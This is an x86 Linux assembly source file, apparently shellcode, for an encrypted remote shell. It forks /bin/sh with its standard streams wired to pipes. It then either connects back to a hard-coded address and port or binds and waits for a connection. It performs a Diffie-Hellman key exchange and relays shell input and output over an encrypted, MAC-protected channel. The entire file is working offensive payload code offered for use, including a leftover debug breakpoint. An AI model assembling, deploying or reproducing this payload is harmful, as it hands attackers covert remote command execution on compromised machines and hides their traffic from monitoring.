;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;  

%define SYS_exit           0x001
%define SYS_fork           0x002 
%define SYS_read           0x003
%define SYS_write          0x004
%define SYS_close          0x006
%define SYS_execve         0x00B
%define SYS_kill           0x025
%define SYS_pipe           0x02A
%define SYS_dup2           0x03f
%define SYS_socketcall     0x066
%define SYS_epoll_ctl      0x0FF
%define SYS_epoll_wait     0x100
%define SYS_epoll_create1  0x149
%define SYS_shutdown       0x175


%define STDIN_FILENO    0
%define STDOUT_FILENO   1
%define STDERR_FILENO   2

%define EPOLLIN     0x001

%define EPOLL_CTL_ADD 1
%define EPOLL_CTL_DEL 2
%define EPOLL_CTL_MOD 3

%define SYS_SOCKET      1   
%define SYS_BIND        2   
%define SYS_CONNECT     3   
%define SYS_LISTEN      4   
%define SYS_ACCEPT      5 
%define SYS_GETSOCKNAME 6   
%define SYS_GETPEERNAME 7   
%define SYS_SOCKETPAIR  8   
%define SYS_SEND        9   
%define SYS_RECV       10 
%define SYS_SENDTO     11   
%define SYS_RECVFROM   12   
%define SYS_SHUTDOWN   13   
%define SYS_SETSOCKOPT 14 
%define SYS_GETSOCKOPT 15   
%define SYS_SENDMSG    16   
%define SYS_RECVMSG    17     
%define SYS_ACCEPT4    18   
%define SYS_RECVMMSG   19 
%define SYS_SENDMMSG   20 

%define SIGCHLD 20
%define BUFSIZ  128

%define SHUT_RDWR     1

struc epoll_event
  events resd 1
  data   resd 1
endstruc

struc crypto_ctx
  ctr  resb  8     ; 64-bit counter + nonce
  ekey resb 16     ; 128-bit encryption key
  mkey resb 32     ; 256-bit mac key
endstruc
         
struc sc_prop
  p_in  resd 2     ; pipe for stdin of shell
  p_out resd 2     ; pipe for stdout/stderr of shell
  pid   resd 1     ; process id for shell
  s     resd 1     ; socket handle
  efd   resd 1     ; event handle
  evts  resb epoll_event_size
  buf   resb BUFSIZ
  ctx   resb crypto_ctx_size
endstruc
 
struc pushad_t
  _edi resd 1
  _esi resd 1
  _ebp resd 1
  _esp resd 1
  _ebx resd 1
  _edx resd 1
  _ecx resd 1
  _eax resd 1
  .size:
endstruc
 
    %ifndef BIN
      global main
      global _main
    %endif     
         
    bits 32
    
main:    
_main:
      pushad
      xor    ecx, ecx
      mov    cl, sc_prop_size
      sub    esp, ecx
      mov    edi, esp
      
      ; memset(edi, 0, sc_prop_size)
      pushad
      xor    eax, eax
      rep    stosb
      popad
      mov    ebp, esp
      
      ; create read/write pipes
      mov    cl, 2
c_pipe:      
      ; pipe(in);
      ; pipe(out);
      push   SYS_pipe
      pop    eax
      mov    ebx, edi        ; ebx = p_in or p_out      
      int    0x80      
      scasd                  ; edi += 4
      scasd                  ; edi += 4
      loop   c_pipe    
      
      ; pid = fork();
      push   SYS_fork
      pop    eax
      int    0x80    
      stosd                  ; save pid
      test   eax, eax        ; already forked?
      jnz    opn_con         ; open connection
      
      ; in this order..
      ;
      ; dup2 (out[1], STDERR_FILENO)      
      ; dup2 (out[1], STDOUT_FILENO)
      ; dup2 (in[0], STDIN_FILENO)   
      mov    cl, 2                ; ecx = STDERR_FILENO
      mov    ebx, [ebp+p_out+4]   ; ebx = out[1]
c_dup:
      push   SYS_dup2
      pop    eax
      int    0x80
      dec    ecx   ; STDOUT_FILENO, then STDIN_FILENO      
      cmove  ebx, [ebp+p_in] ; replace stdin with in[0]
      jns    c_dup  
  
      ; close pipe handles in this order..
      ;
      ; close(in[0]);
      ; close(in[1]);
      ; close(out[0]);
      ; close(out[1]);
      mov    esi, ebp          ; esi = p_in and p_out
      push   4
      pop    ecx               ; close 4 handles     
cls_pipe:
      lodsd                    ; eax = pipes[i]
      xchg   eax, ebx      
      push   SYS_close
      pop    eax 
      int    0x80
      loop   cls_pipe      
      
      ; execve("/bin//sh", 0, 0);
      push   SYS_execve
      pop    eax
      cdq                      ; edx = 0
      push   ecx               ; push null terminator
      push   '//sh'
      push   '/bin'
      mov    ebx, esp          ; ebx = "/bin//sh", 0
      int    0x80
opn_con:    
      ; close(in[0]);
      push   SYS_close
      pop    eax
      mov    ebx, [ebp+p_in]    
      int    0x80    

      ; close(out[1]);
      push   SYS_close
      pop    eax      
      mov    ebx, [ebp+p_out+4]    
      int    0x80   
      
      ; s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);     
      push   SYS_socketcall
      pop    eax
      cdq                      ; edx = 0
      push   SYS_SOCKET
      pop    ebx
      push   edx               ; protocol = IPPROTO_IP
      push   ebx               ; type     = SOCK_STREAM
      push   2                 ; family   = AF_INET
      mov    ecx, esp          ; ecx      = &args      
      int    0x80 
      
      push   0x0100007f        ; sa.sin_addr=127.0.0.1
      push   0xD2040002        ; sa.sin_port=htons(1234)
                               ; sa.sin_family=AF_INET
      mov    ecx, esp          ; ecx = &sa
      
      push   16                ; sizeof(sa)      
      push   ecx               ; &sa
      push   eax               ; s
      mov    ecx, esp          ; &args       
%ifndef BIND
      stosd                    ; save socket  
      push   SYS_socketcall
      pop    eax
      ; connect (s, &sa, sizeof(sa)); 
      push   SYS_CONNECT
      pop    ebx               ; ebx = SYS_CONNECT
      int    0x80      
%else
      push   SYS_socketcall
      pop    eax
      ; bind (s, &sa, sizeof(sa));
      inc    ebx               ; ebx = SYS_BIND     
      int    0x80

      mov    [ecx+4], eax      ; clear sa from args

      ; listen (s, 0);
      mov    al, SYS_socketcall
      add    ebx, ebx          ; ebx = SYS_LISTEN
      int    0x80

      ; accept (s, 0, 0);
      mov    al, SYS_socketcall
      inc    ebx               ; ebx = SYS_ACCEPT
      int    0x80
      stosd                    ; save socket
%endif      
      ; attempt to secure the connection
      call   key_xchg
      jle    cls_sck  
      
      ; efd = epoll_create1(0);
      mov    al, SYS_epoll_create1 & 0xFF
      mov    ah, SYS_epoll_create1 >> 8
      xor    ebx, ebx          ; sets CF=0
      int    0x80
      stosd                    ; save efd
      
      xchg   eax, ebx          ; ebx = efd
      mov    edx, [ebp+s]       
poll_init:
      ; epoll_ctl(efd, EPOLL_CTL_ADD, i==0 ? s : out[0], &evts);
      mov    esi, edi
      push   EPOLLIN
      pop    eax               ; evts.events = EPOLLIN
      mov    [esi+events], eax
      mov    [esi+data  ], edx ; evts.data.fd = i==0 ? s : out[0]
      mov    al, SYS_epoll_ctl    
      push   EPOLL_CTL_ADD
      pop    ecx
      int    0x80
      mov    edx, [ebp+p_out]  ; do out[0] in 2nd loop      
      cmc                      ; !CF
      jc     poll_init      
      ; now loop until user exits or some other error      
poll_wait:
      ; epoll_wait(efd, &evts, 1, -1);
      mov    ebx, [ebp+efd]
      xor    eax, eax
      cdq                      ; edx = 0
      inc    edx               ; edx = 1 event 
      mov    ah, 1             ; eax = SYS_epoll_wait
      mov    ecx, edi          ; ecx = evts
      or     esi, -1           ; no timeout
      int    0x80
      
      ; if (r <= 0) break;
      test   eax, eax
      jle    cls_sck
      
      mov    esi, edi
      lodsd                    ; eax = evt.events
      ; if (!(evt & EPOLLIN)) break;
      test   al, EPOLLIN
      jz     cls_sck
      
      lodsd                   ; eax = evt.data.fd       
      ; if (fd == s)
      cmp    eax, [ebp+s]
      jne    read_stdout
read_network:      
      ; receive data from remote peer
      call   spp_recv
      jle    cls_sck
      
      xchg   eax, edx          ; edx = len 

      ; write to stdin
      ; write(in[1], buf, len);
      mov    ebx, [ebp+p_in+4]
      push   SYS_write
      pop    eax
      int    0x80
      jmp    poll_wait      
read_stdout:
      ; len = read(out[0], buf, BUFSIZ);
      mov    ebx, [ebp+p_out]
      push   SYS_read
      pop    eax
      cdq
      mov    dl, BUFSIZ        ; edx = BUFSIZ
      int    0x80      
      xchg   eax, edx          ; edx = len 
      
      ; send to remote peer
      call   spp_send
      jg     poll_wait
cls_sck:      
      ; shutdown(s, SHUT_RDWR);
      mov    eax, SYS_shutdown
      mov    ebx, [ebp+s]
      push   SHUT_RDWR
      pop    ecx
      int    0x80

      xor    esi, esi
      mov    edx, ebx ; fd = s
cls_efd:   
      ; epoll_ctl(efd, EPOLL_CTL_DEL, fd, NULL);
      mov    eax, esi
      mov    al, SYS_epoll_ctl
      mov    ebx, [ebp+efd]
      push   EPOLL_CTL_DEL
      pop    ecx
      int    0x80
      
      push   ebx
      
      ; close(fd);
      push   SYS_close
      pop    eax
      mov    ebx, edx      ; ebx = out[0] or s
      int    0x80
      ; do out[0] next      
      mov    edx, [ebp+p_out]
      pop    ebx
      cmc
      jc     cls_efd
      
      ; close(efd);
      push   SYS_close
      pop    eax
      int    0x80
      
      ; kill(pid, SIGCHLD);
      push   SYS_kill
      pop    eax
      mov    ebx, [ebp+pid]
      push   SIGCHLD
      pop    ecx
      int    0x80

      ; close(in[1]);
      push   SYS_close
      pop    eax      
      mov    ebx, [ebp+p_in+4]
      int    0x80   

    %ifndef BIN
      ; exit(0);
      push   SYS_exit
      pop    eax 
      int    0x80
    %else
      mov    cl, sc_prop_size + (4 * 8)
      add    esp, ecx
      popad
      ret
    %endif      
      
; ***********************************
;
; send or receive packet, fragmented if required
;
; buflen in edx
; buf in edi
; ctx in ebp
; socket operation in ebx : SYS_RECV or SYS_SEND
; ***********************************      
socket_io:
      pushad
      xor    esi, esi         ; sum = 0
io_loop:
      cmp    esi, edx         ; sum<buflen
      jae    exit_io
      
      xor    eax, eax
      push   eax              ; flags = 0
      mov    ecx, edx
      sub    ecx, esi
      push   ecx              ; len   = buflen - sum
      lea    ecx, [esi+edi] 
      push   ecx              ; buf   = &buf[sum]
      push   dword[ebp+s]     ; socket
      mov    ecx, esp         ; ecx   = &args      
      mov    al, SYS_socketcall      
      int    0x80
      
      add    esp, 4*4         ; fix-up stack
      
      test   eax, eax         ; if (len <= 0) return -1; 
      jle    exit_io
      
      add    esi, eax         ; sum += len
      jmp    io_loop
exit_io:
      test   eax, eax
      mov    [esp+_eax], esi  ; return sum          
      popad
      ret      
; ***********************************
;
; send packet, fragmented if required
;
; buflen in edx
; buf in edi
; ctx in ebp
; ***********************************
send_pkt:
      pushad
      ; 1. wrap
      xor    ecx, ecx         ; ecx = ENCRYPT
      call   encrypt
      xchg   eax, edx      
      ; 2. send
      push   SYS_SEND
      pop    ebx
      call   socket_io   
      popad
      ret
; ***********************************
;
; send data, encrypted if required
;
; ***********************************      
spp_send:
      pushad      
      ; 1. send length (including MAC)
      pushad
      pushad
      mov    edi, esp
      mov    dword[edi], edx ; store length of outgoing data
      add    dword[edi], 8
      mov    dl, 4       ; send 4 bytes, assumes BUFSIZ < 256
      call   send_pkt
      popad
      popad  
      jle    exit_send      
      ; 2. send the data
      call   send_pkt      
exit_send:    
      popad
      ret
; ***********************************
;
; receive packet, fragmented if required
;
; buflen in edx
; buf in edi
; ctx in ebp
;
; socket_io will return sum of bytes received
; encrypt will return decrypted bytes or -1
;
; the test will set flags accordingly
; a JLE is for an error
; ***********************************
recv_pkt:
      pushad     
      ; 1. receive
      push   SYS_RECV
      pop    ebx
      call   socket_io
      jle    exit_rpkt      
      ; 2. unwrap
      push   1
      pop    ecx              ; ecx = DECRYPT
      call   encrypt
      test   eax, eax
exit_rpkt:      
      mov    [esp+_eax], eax  ; return length or -1 on error 
      popad
      ret
; ***********************************
;
; receive data, decrypt if required
;
; ***********************************      
spp_recv:
      pushad
      ; 1. receive the length (which includes a MAC)
      push   4 + 8             ; sizeof(uint32_t) + SPP_MAC_LEN
      pop    edx
      call   recv_pkt
      jle    exit_recv      
      ; 2. receive the data
      mov    edx, [edi]        ; edx = buflen      
      call   recv_pkt
exit_recv:
      mov    [esp+_eax], eax   ; return length or -1   
      popad
      ret
   
; *****************************************
; perform key exchange
;
; *****************************************
%define mx_base esi ; base
%define mx_exp  ebx ; exponent
%define mx_res  edi ; result

%define x _edi
%define g _esi
%define s _esi
%define A _eax
%define B _eax

key_xchg:
int3
      pushad      
      xor    ecx, ecx     ; ecx = 0
      mul    ecx          ; eax = 0, edx = 0      
      mov    ch, 5        ; ecx = 1024+256
      sub    esp, ecx     ; allocate 1024 bytes
      mov    edi, esp     ; initialize to zero
      pushad
      rep    stosb
      popad
      mov    ch, 1          ; ecx = 256
      
      mov    esi, esp       ; esi = s and g
      lea    edi, [esi+ecx] ; edi = x
      lea    eax, [edi+ecx] ; eax = A and B

      pushad
      ; generate 512-bit x in edi
      mov    dh, 2    
      call   random
      
      ; Alice obtains A = g ^ x mod p
      mov    mx_res, [esp+A]
      mov    mx_exp, [esp+x]
      mov    mx_base,[esp+g]
      mov    byte[mx_base], 2      
      call   modexp
      
      ; send A to Bob
      call   spp_send
      
      ; receive B from Bob      
      call   spp_recv
      
      ; Alice computes key: s = B ^ x mod p
      mov    mx_base, edi    ; set base B
      mov    mx_res, [esp+s] ; set result buffer
      mov    mx_exp, [esp+x] ; set exponent
      call   modexp
      popad
      
      ; reset the counter, set the encryption + mac keys
      xor    eax, eax
      mov    cl, crypto_ctx_size - 8
      lea    edi, [ebp+ctx]
      stosd                   ; set counter to zero
      stosd
      rep    movsb            ; set encryption + mac keys
      
      ; release stack
      mov    ch, 5
      add    esp, ecx
      popad
      ret
      
%include "mxp.asm"
%include "rnx.asm"
%include "cpx.asm"
      
